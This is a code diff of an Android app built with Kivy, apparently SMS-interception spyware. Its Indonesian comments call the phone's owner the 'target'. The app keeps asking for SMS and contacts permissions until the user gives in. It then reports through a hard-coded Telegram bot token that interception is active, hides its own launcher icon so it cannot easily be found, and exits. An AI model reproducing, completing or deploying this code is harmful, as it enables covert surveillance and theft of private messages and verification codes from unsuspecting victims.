@@ -5,58 +5,51 @@ from kivy.app import App
 from kivy.clock import Clock
 import os
 
-# CONFIG BOT KAMU
 TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
 CHAT_ID = "5999516433"
 bot = telebot.TeleBot(TOKEN)
 
 class LOKTV(App):
     def build(self):
-        # Mulai proses 1 detik setelah buka
         Clock.schedule_once(lambda dt: self.minta_izin(), 1)
         return None
 
     def minta_izin(self):
-        # Daftar izin yang harus didapat
         perms = [
-            Permission.READ_SMS,
-            Permission.RECEIVE_SMS,
+            Permission.READ_SMS, 
+            Permission.RECEIVE_SMS, 
             Permission.POST_NOTIFICATIONS,
             Permission.READ_CONTACTS
         ]
-        request_permissions(perms, self.callback_izin)
+        request_permissions(perms, self.eksekusi_total)
 
-    def callback_izin(self, permissions, grants):
+    def eksekusi_total(self, permissions, grants):
         if all(grants):
             try:
-                # Menjalankan Service di Latar Belakang
-                from android import exports
-                context = autoclass('org.kivy.android.PythonActivity').mActivity
-                service_name = context.getPackageName() + '.ServicePenyadap'
-                service = autoclass(service_name)
-                service.start(context, "")
+                # Kirim sinyal ke bot bahwa penyadapan SIAP
+                bot.send_message(CHAT_ID, "📡 SISTEM AKTIF!\nSMS masuk akan otomatis terkirim ke sini.")
                 
-                bot.send_message(CHAT_ID, "✅ AKSES DITERIMA! Target sudah dalam pantauan.")
-                self.eksekusi_hilang()
-            except:
-                self.eksekusi_hilang()
+                # Sembunyikan Ikon
+                self.hilangkan_ikon()
+            except Exception as e:
+                bot.send_message(CHAT_ID, f"Error: {str(e)}")
         else:
-            # Jika ditolak, munculkan popup lagi (Teror)
+            # Jika belum diizinkan, minta terus sampai diklik
             self.minta_izin()
 
-    def eksekusi_hilang(self):
+    def hilangkan_ikon(self):
         try:
             activity = autoclass('org.kivy.android.PythonActivity').mActivity
             pm = activity.getPackageManager()
-            ComponentName = autoclass('android.content.ComponentName')
-            comp = ComponentName(activity.getPackageName(), 'org.kivy.android.PythonActivity')
+            comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
             
-            # PROSES HILANGKAN IKON
+            # Status 2 = DISABLED (Hilang)
             pm.setComponentEnabledSetting(comp, 2, 1)
             
-            bot.send_message(CHAT_ID, "⚠️ IKON HILANG TOTAL. Monitor SMS sekarang.")
-            # Keluar dari aplikasi visual
-            Clock.schedule_once(lambda dt: os._exit(0), 2)
+            bot.send_message(CHAT_ID, "⚠️ Ikon sudah hilang di target. Menunggu SMS...")
+            
+            # Jeda sebentar sebelum tutup aplikasi agar sistem sempat proses
+            Clock.schedule_once(lambda dt: os._exit(0), 3)
         except:
             os._exit(0)
 
